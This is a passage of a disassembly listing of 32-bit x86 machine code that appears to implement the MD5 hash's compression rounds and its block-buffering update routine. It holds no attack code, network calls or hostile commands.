  40b7c5:	8b d9                	mov    %ecx,%ebx
  40b7c7:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b7ca:	23 f9                	and    %ecx,%edi
  40b7cc:	f7 d3                	not    %ebx
  40b7ce:	23 5d fc             	and    -0x4(%ebp),%ebx
  40b7d1:	0b df                	or     %edi,%ebx
  40b7d3:	03 18                	add    (%eax),%ebx
  40b7d5:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40b7d8:	8d 94 13 aa c7 b6 e9 	lea    -0x16493856(%ebx,%edx,1),%edx
  40b7df:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b7e2:	f7 d7                	not    %edi
  40b7e4:	23 7d f8             	and    -0x8(%ebp),%edi
  40b7e7:	c1 ca 0c             	ror    $0xc,%edx
  40b7ea:	03 55 f8             	add    -0x8(%ebp),%edx
  40b7ed:	23 da                	and    %edx,%ebx
  40b7ef:	0b fb                	or     %ebx,%edi
  40b7f1:	03 78 14             	add    0x14(%eax),%edi
  40b7f4:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b7f7:	8d 8c 0f 5d 10 2f d6 	lea    -0x29d0efa3(%edi,%ecx,1),%ecx
  40b7fe:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b801:	c1 c1 05             	rol    $0x5,%ecx
  40b804:	f7 d7                	not    %edi
  40b806:	03 ca                	add    %edx,%ecx
  40b808:	23 d9                	and    %ecx,%ebx
  40b80a:	23 fa                	and    %edx,%edi
  40b80c:	0b fb                	or     %ebx,%edi
  40b80e:	03 78 28             	add    0x28(%eax),%edi
  40b811:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b814:	8d bc 1f 53 14 44 02 	lea    0x2441453(%edi,%ebx,1),%edi
  40b81b:	c1 c7 09             	rol    $0x9,%edi
  40b81e:	03 f9                	add    %ecx,%edi
  40b820:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b823:	23 fa                	and    %edx,%edi
  40b825:	8b da                	mov    %edx,%ebx
  40b827:	f7 d3                	not    %ebx
  40b829:	23 d9                	and    %ecx,%ebx
  40b82b:	0b df                	or     %edi,%ebx
  40b82d:	03 58 3c             	add    0x3c(%eax),%ebx
  40b830:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b833:	8d bc 3b 81 e6 a1 d8 	lea    -0x275e197f(%ebx,%edi,1),%edi
  40b83a:	c1 c7 0e             	rol    $0xe,%edi
  40b83d:	03 7d fc             	add    -0x4(%ebp),%edi
  40b840:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b843:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b846:	23 d9                	and    %ecx,%ebx
  40b848:	8b f9                	mov    %ecx,%edi
  40b84a:	f7 d7                	not    %edi
  40b84c:	23 7d fc             	and    -0x4(%ebp),%edi
  40b84f:	0b fb                	or     %ebx,%edi
  40b851:	03 78 10             	add    0x10(%eax),%edi
  40b854:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b857:	8d 94 17 c8 fb d3 e7 	lea    -0x182c0438(%edi,%edx,1),%edx
  40b85e:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40b861:	f7 d7                	not    %edi
  40b863:	23 7d f8             	and    -0x8(%ebp),%edi
  40b866:	c1 ca 0c             	ror    $0xc,%edx
  40b869:	03 55 f8             	add    -0x8(%ebp),%edx
  40b86c:	23 da                	and    %edx,%ebx
  40b86e:	0b fb                	or     %ebx,%edi
  40b870:	03 78 24             	add    0x24(%eax),%edi
  40b873:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b876:	8d 8c 0f e6 cd e1 21 	lea    0x21e1cde6(%edi,%ecx,1),%ecx
  40b87d:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b880:	f7 d7                	not    %edi
  40b882:	23 fa                	and    %edx,%edi
  40b884:	c1 c1 05             	rol    $0x5,%ecx
  40b887:	03 ca                	add    %edx,%ecx
  40b889:	23 d9                	and    %ecx,%ebx
  40b88b:	0b fb                	or     %ebx,%edi
  40b88d:	03 78 38             	add    0x38(%eax),%edi
  40b890:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b893:	8d bc 1f d6 07 37 c3 	lea    -0x3cc8f82a(%edi,%ebx,1),%edi
  40b89a:	c1 c7 09             	rol    $0x9,%edi
  40b89d:	03 f9                	add    %ecx,%edi
  40b89f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b8a2:	23 fa                	and    %edx,%edi
  40b8a4:	8b da                	mov    %edx,%ebx
  40b8a6:	f7 d3                	not    %ebx
  40b8a8:	23 d9                	and    %ecx,%ebx
  40b8aa:	0b df                	or     %edi,%ebx
  40b8ac:	03 58 0c             	add    0xc(%eax),%ebx
  40b8af:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b8b2:	8d bc 3b 87 0d d5 f4 	lea    -0xb2af279(%ebx,%edi,1),%edi
  40b8b9:	c1 c7 0e             	rol    $0xe,%edi
  40b8bc:	03 7d fc             	add    -0x4(%ebp),%edi
  40b8bf:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b8c2:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b8c5:	23 d9                	and    %ecx,%ebx
  40b8c7:	8b f9                	mov    %ecx,%edi
  40b8c9:	f7 d7                	not    %edi
  40b8cb:	23 7d fc             	and    -0x4(%ebp),%edi
  40b8ce:	0b fb                	or     %ebx,%edi
  40b8d0:	03 78 20             	add    0x20(%eax),%edi
  40b8d3:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b8d6:	8d 94 17 ed 14 5a 45 	lea    0x455a14ed(%edi,%edx,1),%edx
  40b8dd:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40b8e0:	c1 ca 0c             	ror    $0xc,%edx
  40b8e3:	03 55 f8             	add    -0x8(%ebp),%edx
  40b8e6:	f7 d7                	not    %edi
  40b8e8:	23 7d f8             	and    -0x8(%ebp),%edi
  40b8eb:	23 da                	and    %edx,%ebx
  40b8ed:	0b fb                	or     %ebx,%edi
  40b8ef:	03 78 34             	add    0x34(%eax),%edi
  40b8f2:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b8f5:	8d 8c 0f 05 e9 e3 a9 	lea    -0x561c16fb(%edi,%ecx,1),%ecx
  40b8fc:	c1 c1 05             	rol    $0x5,%ecx
  40b8ff:	f7 d3                	not    %ebx
  40b901:	03 ca                	add    %edx,%ecx
  40b903:	23 da                	and    %edx,%ebx
  40b905:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b908:	23 f9                	and    %ecx,%edi
  40b90a:	0b df                	or     %edi,%ebx
  40b90c:	8b 78 08             	mov    0x8(%eax),%edi
  40b90f:	03 df                	add    %edi,%ebx
  40b911:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40b914:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40b917:	8d bc 3b f8 a3 ef fc 	lea    -0x3105c08(%ebx,%edi,1),%edi
  40b91e:	c1 c7 09             	rol    $0x9,%edi
  40b921:	03 f9                	add    %ecx,%edi
  40b923:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b926:	23 fa                	and    %edx,%edi
  40b928:	8b da                	mov    %edx,%ebx
  40b92a:	f7 d3                	not    %ebx
  40b92c:	23 d9                	and    %ecx,%ebx
  40b92e:	0b df                	or     %edi,%ebx
  40b930:	03 58 1c             	add    0x1c(%eax),%ebx
  40b933:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b936:	8d bc 3b d9 02 6f 67 	lea    0x676f02d9(%ebx,%edi,1),%edi
  40b93d:	c1 c7 0e             	rol    $0xe,%edi
  40b940:	03 7d fc             	add    -0x4(%ebp),%edi
  40b943:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b946:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b949:	23 d9                	and    %ecx,%ebx
  40b94b:	8b f9                	mov    %ecx,%edi
  40b94d:	f7 d7                	not    %edi
  40b94f:	23 7d fc             	and    -0x4(%ebp),%edi
  40b952:	0b fb                	or     %ebx,%edi
  40b954:	03 78 30             	add    0x30(%eax),%edi
  40b957:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b95a:	33 5d f8             	xor    -0x8(%ebp),%ebx
  40b95d:	8d 94 17 8a 4c 2a 8d 	lea    -0x72d5b376(%edi,%edx,1),%edx
  40b964:	8b 78 14             	mov    0x14(%eax),%edi
  40b967:	c1 ca 0c             	ror    $0xc,%edx
  40b96a:	03 55 f8             	add    -0x8(%ebp),%edx
  40b96d:	89 7d c8             	mov    %edi,-0x38(%ebp)
  40b970:	33 da                	xor    %edx,%ebx
  40b972:	03 df                	add    %edi,%ebx
  40b974:	8b 78 20             	mov    0x20(%eax),%edi
  40b977:	8d 8c 0b 42 39 fa ff 	lea    -0x5c6be(%ebx,%ecx,1),%ecx
  40b97e:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b981:	33 da                	xor    %edx,%ebx
  40b983:	c1 c1 04             	rol    $0x4,%ecx
  40b986:	03 ca                	add    %edx,%ecx
  40b988:	33 d9                	xor    %ecx,%ebx
  40b98a:	03 df                	add    %edi,%ebx
  40b98c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40b98f:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40b992:	8d bc 3b 81 f6 71 87 	lea    -0x788e097f(%ebx,%edi,1),%edi
  40b999:	c1 c7 0b             	rol    $0xb,%edi
  40b99c:	03 f9                	add    %ecx,%edi
  40b99e:	8b df                	mov    %edi,%ebx
  40b9a0:	33 da                	xor    %edx,%ebx
  40b9a2:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b9a5:	8b 78 2c             	mov    0x2c(%eax),%edi
  40b9a8:	33 d9                	xor    %ecx,%ebx
  40b9aa:	03 df                	add    %edi,%ebx
  40b9ac:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40b9af:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b9b2:	8d bc 3b 22 61 9d 6d 	lea    0x6d9d6122(%ebx,%edi,1),%edi
  40b9b9:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b9bc:	c1 c7 10             	rol    $0x10,%edi
  40b9bf:	03 7d fc             	add    -0x4(%ebp),%edi
  40b9c2:	33 df                	xor    %edi,%ebx
  40b9c4:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b9c7:	8b 78 38             	mov    0x38(%eax),%edi
  40b9ca:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40b9cd:	33 d9                	xor    %ecx,%ebx
  40b9cf:	03 df                	add    %edi,%ebx
  40b9d1:	8d 94 13 0c 38 e5 fd 	lea    -0x21ac7f4(%ebx,%edx,1),%edx
  40b9d8:	8b 58 04             	mov    0x4(%eax),%ebx
  40b9db:	c1 ca 09             	ror    $0x9,%edx
  40b9de:	03 55 f8             	add    -0x8(%ebp),%edx
  40b9e1:	89 7d e0             	mov    %edi,-0x20(%ebp)
  40b9e4:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40b9e7:	33 fa                	xor    %edx,%edi
  40b9e9:	03 fb                	add    %ebx,%edi
  40b9eb:	8d 8c 0f 44 ea be a4 	lea    -0x5b4115bc(%edi,%ecx,1),%ecx
  40b9f2:	c1 c1 04             	rol    $0x4,%ecx
  40b9f5:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40b9f8:	03 ca                	add    %edx,%ecx
  40b9fa:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b9fd:	33 da                	xor    %edx,%ebx
  40b9ff:	8b 78 10             	mov    0x10(%eax),%edi
  40ba02:	33 d9                	xor    %ecx,%ebx
  40ba04:	03 df                	add    %edi,%ebx
  40ba06:	89 7d cc             	mov    %edi,-0x34(%ebp)
  40ba09:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40ba0c:	8d bc 3b a9 cf de 4b 	lea    0x4bdecfa9(%ebx,%edi,1),%edi
  40ba13:	c1 c7 0b             	rol    $0xb,%edi
  40ba16:	03 f9                	add    %ecx,%edi
  40ba18:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40ba1b:	33 fa                	xor    %edx,%edi
  40ba1d:	33 f9                	xor    %ecx,%edi
  40ba1f:	03 78 1c             	add    0x1c(%eax),%edi
  40ba22:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40ba25:	8d bc 1f 60 4b bb f6 	lea    -0x944b4a0(%edi,%ebx,1),%edi
  40ba2c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40ba2f:	c1 c7 10             	rol    $0x10,%edi
  40ba32:	03 7d fc             	add    -0x4(%ebp),%edi
  40ba35:	33 df                	xor    %edi,%ebx
  40ba37:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40ba3a:	8b 78 28             	mov    0x28(%eax),%edi
  40ba3d:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40ba40:	33 d9                	xor    %ecx,%ebx
  40ba42:	03 df                	add    %edi,%ebx
  40ba44:	8d 94 13 70 bc bf be 	lea    -0x41404390(%ebx,%edx,1),%edx
  40ba4b:	8b 58 34             	mov    0x34(%eax),%ebx
  40ba4e:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40ba51:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40ba54:	c1 ca 09             	ror    $0x9,%edx
  40ba57:	03 55 f8             	add    -0x8(%ebp),%edx
  40ba5a:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40ba5d:	33 fa                	xor    %edx,%edi
  40ba5f:	03 fb                	add    %ebx,%edi
  40ba61:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40ba64:	8d 8c 0f c6 7e 9b 28 	lea    0x289b7ec6(%edi,%ecx,1),%ecx
  40ba6b:	8b 38                	mov    (%eax),%edi
  40ba6d:	33 da                	xor    %edx,%ebx
  40ba6f:	89 7d b8             	mov    %edi,-0x48(%ebp)
  40ba72:	c1 c1 04             	rol    $0x4,%ecx
  40ba75:	03 ca                	add    %edx,%ecx
  40ba77:	33 d9                	xor    %ecx,%ebx
  40ba79:	03 df                	add    %edi,%ebx
  40ba7b:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40ba7e:	8d bc 3b fa 27 a1 ea 	lea    -0x155ed806(%ebx,%edi,1),%edi
  40ba85:	c1 c7 0b             	rol    $0xb,%edi
  40ba88:	03 f9                	add    %ecx,%edi
  40ba8a:	8b df                	mov    %edi,%ebx
  40ba8c:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40ba8f:	8b 78 0c             	mov    0xc(%eax),%edi
  40ba92:	33 da                	xor    %edx,%ebx
  40ba94:	33 d9                	xor    %ecx,%ebx
  40ba96:	03 df                	add    %edi,%ebx
  40ba98:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40ba9b:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40ba9e:	8d bc 3b 85 30 ef d4 	lea    -0x2b10cf7b(%ebx,%edi,1),%edi
  40baa5:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40baa8:	c1 c7 10             	rol    $0x10,%edi
  40baab:	03 7d fc             	add    -0x4(%ebp),%edi
  40baae:	33 df                	xor    %edi,%ebx
  40bab0:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40bab3:	8b 78 18             	mov    0x18(%eax),%edi
  40bab6:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40bab9:	33 d9                	xor    %ecx,%ebx
  40babb:	03 df                	add    %edi,%ebx
  40babd:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40bac0:	8b 7d f4             	mov    -0xc(%ebp),%edi
  40bac3:	8d 94 13 05 1d 88 04 	lea    0x4881d05(%ebx,%edx,1),%edx
  40baca:	8b 58 24             	mov    0x24(%eax),%ebx
  40bacd:	c1 ca 09             	ror    $0x9,%edx
  40bad0:	03 55 f8             	add    -0x8(%ebp),%edx
  40bad3:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40bad6:	33 fa                	xor    %edx,%edi
  40bad8:	03 fb                	add    %ebx,%edi
  40bada:	8d 8c 0f 39 d0 d4 d9 	lea    -0x262b2fc7(%edi,%ecx,1),%ecx
  40bae1:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40bae4:	c1 c1 04             	rol    $0x4,%ecx
  40bae7:	03 ca                	add    %edx,%ecx
  40bae9:	33 fa                	xor    %edx,%edi
  40baeb:	33 f9                	xor    %ecx,%edi
  40baed:	03 78 30             	add    0x30(%eax),%edi
  40baf0:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40baf3:	8d bc 1f e5 99 db e6 	lea    -0x1924661b(%edi,%ebx,1),%edi
  40bafa:	8b 40 3c             	mov    0x3c(%eax),%eax
  40bafd:	c1 c7 0b             	rol    $0xb,%edi
  40bb00:	03 f9                	add    %ecx,%edi
  40bb02:	8b df                	mov    %edi,%ebx
  40bb04:	33 da                	xor    %edx,%ebx
  40bb06:	33 d9                	xor    %ecx,%ebx
  40bb08:	03 d8                	add    %eax,%ebx
  40bb0a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40bb0d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40bb10:	8d 84 03 f8 7c a2 1f 	lea    0x1fa27cf8(%ebx,%eax,1),%eax
  40bb17:	c1 c0 10             	rol    $0x10,%eax
  40bb1a:	03 c7                	add    %edi,%eax
  40bb1c:	8b df                	mov    %edi,%ebx
  40bb1e:	33 d8                	xor    %eax,%ebx
  40bb20:	33 d9                	xor    %ecx,%ebx
  40bb22:	03 5d f0             	add    -0x10(%ebp),%ebx
  40bb25:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40bb28:	8d 94 13 65 56 ac c4 	lea    -0x3b53a99b(%ebx,%edx,1),%edx
  40bb2f:	c1 ca 09             	ror    $0x9,%edx
  40bb32:	03 d0                	add    %eax,%edx
  40bb34:	8b df                	mov    %edi,%ebx
  40bb36:	f7 d3                	not    %ebx
  40bb38:	0b da                	or     %edx,%ebx
  40bb3a:	33 d8                	xor    %eax,%ebx
  40bb3c:	03 5d b8             	add    -0x48(%ebp),%ebx
  40bb3f:	8d 8c 0b 44 22 29 f4 	lea    -0xbd6ddbc(%ebx,%ecx,1),%ecx
  40bb46:	c1 c1 06             	rol    $0x6,%ecx
  40bb49:	03 ca                	add    %edx,%ecx
  40bb4b:	8b d8                	mov    %eax,%ebx
  40bb4d:	f7 d3                	not    %ebx
  40bb4f:	0b d9                	or     %ecx,%ebx
  40bb51:	33 da                	xor    %edx,%ebx
  40bb53:	03 5d c0             	add    -0x40(%ebp),%ebx
  40bb56:	8d bc 3b 97 ff 2a 43 	lea    0x432aff97(%ebx,%edi,1),%edi
  40bb5d:	c1 c7 0a             	rol    $0xa,%edi
  40bb60:	03 f9                	add    %ecx,%edi
  40bb62:	8b da                	mov    %edx,%ebx
  40bb64:	f7 d3                	not    %ebx
  40bb66:	0b df                	or     %edi,%ebx
  40bb68:	33 d9                	xor    %ecx,%ebx
  40bb6a:	03 5d e0             	add    -0x20(%ebp),%ebx
  40bb6d:	8d 84 03 a7 23 94 ab 	lea    -0x546bdc59(%ebx,%eax,1),%eax
  40bb74:	c1 c0 0f             	rol    $0xf,%eax
  40bb77:	03 c7                	add    %edi,%eax
  40bb79:	8b d9                	mov    %ecx,%ebx
  40bb7b:	f7 d3                	not    %ebx
  40bb7d:	0b d8                	or     %eax,%ebx
  40bb7f:	33 df                	xor    %edi,%ebx
  40bb81:	03 5d c8             	add    -0x38(%ebp),%ebx
  40bb84:	8d 94 13 39 a0 93 fc 	lea    -0x36c5fc7(%ebx,%edx,1),%edx
  40bb8b:	c1 ca 0b             	ror    $0xb,%edx
  40bb8e:	03 d0                	add    %eax,%edx
  40bb90:	8b df                	mov    %edi,%ebx
  40bb92:	f7 d3                	not    %ebx
  40bb94:	0b da                	or     %edx,%ebx
  40bb96:	33 d8                	xor    %eax,%ebx
  40bb98:	03 5d d8             	add    -0x28(%ebp),%ebx
  40bb9b:	8d 8c 0b c3 59 5b 65 	lea    0x655b59c3(%ebx,%ecx,1),%ecx
  40bba2:	c1 c1 06             	rol    $0x6,%ecx
  40bba5:	03 ca                	add    %edx,%ecx
  40bba7:	8b d8                	mov    %eax,%ebx
  40bba9:	f7 d3                	not    %ebx
  40bbab:	0b d9                	or     %ecx,%ebx
  40bbad:	33 da                	xor    %edx,%ebx
  40bbaf:	03 5d ec             	add    -0x14(%ebp),%ebx
  40bbb2:	8d bc 3b 92 cc 0c 8f 	lea    -0x70f3336e(%ebx,%edi,1),%edi
  40bbb9:	c1 c7 0a             	rol    $0xa,%edi
  40bbbc:	03 f9                	add    %ecx,%edi
  40bbbe:	8b da                	mov    %edx,%ebx
  40bbc0:	f7 d3                	not    %ebx
  40bbc2:	0b df                	or     %edi,%ebx
  40bbc4:	33 d9                	xor    %ecx,%ebx
  40bbc6:	03 5d d0             	add    -0x30(%ebp),%ebx
  40bbc9:	8d 84 03 7d f4 ef ff 	lea    -0x100b83(%ebx,%eax,1),%eax
  40bbd0:	c1 c0 0f             	rol    $0xf,%eax
  40bbd3:	8b d9                	mov    %ecx,%ebx
  40bbd5:	03 c7                	add    %edi,%eax
  40bbd7:	f7 d3                	not    %ebx
  40bbd9:	0b d8                	or     %eax,%ebx
  40bbdb:	33 df                	xor    %edi,%ebx
  40bbdd:	03 5d e8             	add    -0x18(%ebp),%ebx
  40bbe0:	8d 94 13 d1 5d 84 85 	lea    -0x7a7ba22f(%ebx,%edx,1),%edx
  40bbe7:	c1 ca 0b             	ror    $0xb,%edx
  40bbea:	03 d0                	add    %eax,%edx
  40bbec:	8b df                	mov    %edi,%ebx
  40bbee:	f7 d3                	not    %ebx
  40bbf0:	0b da                	or     %edx,%ebx
  40bbf2:	33 d8                	xor    %eax,%ebx
  40bbf4:	03 5d e4             	add    -0x1c(%ebp),%ebx
  40bbf7:	8d 8c 0b 4f 7e a8 6f 	lea    0x6fa87e4f(%ebx,%ecx,1),%ecx
  40bbfe:	c1 c1 06             	rol    $0x6,%ecx
  40bc01:	03 ca                	add    %edx,%ecx
  40bc03:	8b d8                	mov    %eax,%ebx
  40bc05:	f7 d3                	not    %ebx
  40bc07:	0b d9                	or     %ecx,%ebx
  40bc09:	33 da                	xor    %edx,%ebx
  40bc0b:	03 5d f4             	add    -0xc(%ebp),%ebx
  40bc0e:	8d bc 3b e0 e6 2c fe 	lea    -0x1d31920(%ebx,%edi,1),%edi
  40bc15:	c1 c7 0a             	rol    $0xa,%edi
  40bc18:	03 f9                	add    %ecx,%edi
  40bc1a:	8b da                	mov    %edx,%ebx
  40bc1c:	f7 d3                	not    %ebx
  40bc1e:	0b df                	or     %edi,%ebx
  40bc20:	33 d9                	xor    %ecx,%ebx
  40bc22:	03 5d dc             	add    -0x24(%ebp),%ebx
  40bc25:	8d 84 03 14 43 01 a3 	lea    -0x5cfebcec(%ebx,%eax,1),%eax
  40bc2c:	c1 c0 0f             	rol    $0xf,%eax
  40bc2f:	03 c7                	add    %edi,%eax
  40bc31:	8b d9                	mov    %ecx,%ebx
  40bc33:	f7 d3                	not    %ebx
  40bc35:	0b d8                	or     %eax,%ebx
  40bc37:	33 df                	xor    %edi,%ebx
  40bc39:	03 5d d4             	add    -0x2c(%ebp),%ebx
  40bc3c:	8d 94 13 a1 11 08 4e 	lea    0x4e0811a1(%ebx,%edx,1),%edx
  40bc43:	c1 ca 0b             	ror    $0xb,%edx
  40bc46:	03 d0                	add    %eax,%edx
  40bc48:	8b df                	mov    %edi,%ebx
  40bc4a:	f7 d3                	not    %ebx
  40bc4c:	0b da                	or     %edx,%ebx
  40bc4e:	33 d8                	xor    %eax,%ebx
  40bc50:	03 5d cc             	add    -0x34(%ebp),%ebx
  40bc53:	8d 8c 0b 82 7e 53 f7 	lea    -0x8ac817e(%ebx,%ecx,1),%ecx
  40bc5a:	c1 c1 06             	rol    $0x6,%ecx
  40bc5d:	03 ca                	add    %edx,%ecx
  40bc5f:	8b d8                	mov    %eax,%ebx
  40bc61:	f7 d3                	not    %ebx
  40bc63:	0b d9                	or     %ecx,%ebx
  40bc65:	33 da                	xor    %edx,%ebx
  40bc67:	03 5d c4             	add    -0x3c(%ebp),%ebx
  40bc6a:	01 4e 08             	add    %ecx,0x8(%esi)
  40bc6d:	8d bc 3b 35 f2 3a bd 	lea    -0x42c50dcb(%ebx,%edi,1),%edi
  40bc74:	c1 c7 0a             	rol    $0xa,%edi
  40bc77:	03 f9                	add    %ecx,%edi
  40bc79:	8b da                	mov    %edx,%ebx
  40bc7b:	f7 d3                	not    %ebx
  40bc7d:	0b df                	or     %edi,%ebx
  40bc7f:	33 d9                	xor    %ecx,%ebx
  40bc81:	03 5d f0             	add    -0x10(%ebp),%ebx
  40bc84:	8d 84 03 bb d2 d7 2a 	lea    0x2ad7d2bb(%ebx,%eax,1),%eax
  40bc8b:	c1 c0 0f             	rol    $0xf,%eax
  40bc8e:	03 c7                	add    %edi,%eax
  40bc90:	01 46 10             	add    %eax,0x10(%esi)
  40bc93:	8b d9                	mov    %ecx,%ebx
  40bc95:	f7 d3                	not    %ebx
  40bc97:	0b d8                	or     %eax,%ebx
  40bc99:	33 df                	xor    %edi,%ebx
  40bc9b:	03 5d bc             	add    -0x44(%ebp),%ebx
  40bc9e:	8d 94 13 91 d3 86 eb 	lea    -0x14792c6f(%ebx,%edx,1),%edx
  40bca5:	c1 ca 0b             	ror    $0xb,%edx
  40bca8:	03 d0                	add    %eax,%edx
  40bcaa:	01 56 0c             	add    %edx,0xc(%esi)
  40bcad:	01 7e 14             	add    %edi,0x14(%esi)
  40bcb0:	5f                   	pop    %edi
  40bcb1:	5b                   	pop    %ebx
  40bcb2:	c9                   	leave
  40bcb3:	c3                   	ret
  40bcb4:	55                   	push   %ebp
  40bcb5:	8b ec                	mov    %esp,%ebp
  40bcb7:	53                   	push   %ebx
  40bcb8:	8b d9                	mov    %ecx,%ebx
  40bcba:	56                   	push   %esi
  40bcbb:	8b 75 08             	mov    0x8(%ebp),%esi
  40bcbe:	01 06                	add    %eax,(%esi)
  40bcc0:	8b ca                	mov    %edx,%ecx
  40bcc2:	c1 f9 1d             	sar    $0x1d,%ecx
  40bcc5:	01 4e 04             	add    %ecx,0x4(%esi)
  40bcc8:	39 06                	cmp    %eax,(%esi)
  40bcca:	8b 4e 04             	mov    0x4(%esi),%ecx
  40bccd:	57                   	push   %edi
  40bcce:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40bcd1:	73 04                	jae    0x40bcd7
  40bcd3:	41                   	inc    %ecx
  40bcd4:	89 4e 04             	mov    %ecx,0x4(%esi)
  40bcd7:	85 db                	test   %ebx,%ebx
  40bcd9:	74 3f                	je     0x40bd1a
  40bcdb:	6a 40                	push   $0x40
  40bcdd:	8d 04 13             	lea    (%ebx,%edx,1),%eax
  40bce0:	5f                   	pop    %edi
  40bce1:	3b c7                	cmp    %edi,%eax
  40bce3:	7e 04                	jle    0x40bce9
  40bce5:	2b fb                	sub    %ebx,%edi
  40bce7:	eb 02                	jmp    0x40bceb
  40bce9:	8b fa                	mov    %edx,%edi
  40bceb:	57                   	push   %edi
  40bcec:	ff 75 0c             	push   0xc(%ebp)
  40bcef:	8d 44 33 18          	lea    0x18(%ebx,%esi,1),%eax
  40bcf3:	50                   	push   %eax
  40bcf4:	e8 d7 08 00 00       	call   0x40c5d0
  40bcf9:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  40bcfc:	83 c4 0c             	add    $0xc,%esp
  40bcff:	83 f8 40             	cmp    $0x40,%eax
  40bd02:	7c 4c                	jl     0x40bd50
  40bd04:	8b 45 0c             	mov    0xc(%ebp),%eax
  40bd07:	29 7d 10             	sub    %edi,0x10(%ebp)
  40bd0a:	03 c7                	add    %edi,%eax
  40bd0c:	89 45 0c             	mov    %eax,0xc(%ebp)
  40bd0f:	8d 46 18             	lea    0x18(%esi),%eax
  40bd12:	e8 05 f8 ff ff       	call   0x40b51c
  40bd17:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40bd1a:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40bd1d:	83 fb 40             	cmp    $0x40,%ebx
  40bd20:	7c 18                	jl     0x40bd3a
  40bd22:	c1 eb 06             	shr    $0x6,%ebx
  40bd25:	8b c3                	mov    %ebx,%eax
  40bd27:	6b c0 c0             	imul   $0xffffffc0,%eax,%eax
  40bd2a:	01 45 10             	add    %eax,0x10(%ebp)
  40bd2d:	8b c7                	mov    %edi,%eax
  40bd2f:	e8 e8 f7 ff ff       	call   0x40b51c
  40bd34:	83 c7 40             	add    $0x40,%edi
  40bd37:	4b                   	dec    %ebx
  40bd38:	75 f3                	jne    0x40bd2d
  40bd3a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40bd3e:	74 10                	je     0x40bd50
  40bd40:	ff 75 10             	push   0x10(%ebp)
  40bd43:	83 c6 18             	add    $0x18,%esi
  40bd46:	57                   	push   %edi
  40bd47:	56                   	push   %esi
  40bd48:	e8 83 08 00 00       	call   0x40c5d0
  40bd4d:	83 c4 0c             	add    $0xc,%esp
  40bd50:	5f                   	pop    %edi
  40bd51:	5e                   	pop    %esi
  40bd52:	5b                   	pop    %ebx
  40bd53:	5d                   	pop    %ebp
  40bd54:	c3                   	ret
  40bd55:	55                   	push   %ebp
  40bd56:	8b ec                	mov    %esp,%ebp
  40bd58:	51                   	push   %ecx
  40bd59:	51                   	push   %ecx
  40bd5a:	33 c0                	xor    %eax,%eax
  40bd5c:	8b d0                	mov    %eax,%edx
  40bd5e:	c1 fa 02             	sar    $0x2,%edx
  40bd61:	8b 14 96             	mov    (%esi,%edx,4),%edx
  40bd64:	8b c8                	mov    %eax,%ecx
  40bd66:	83 e1 03             	and    $0x3,%ecx
  40bd69:	c1 e1 03             	shl    $0x3,%ecx
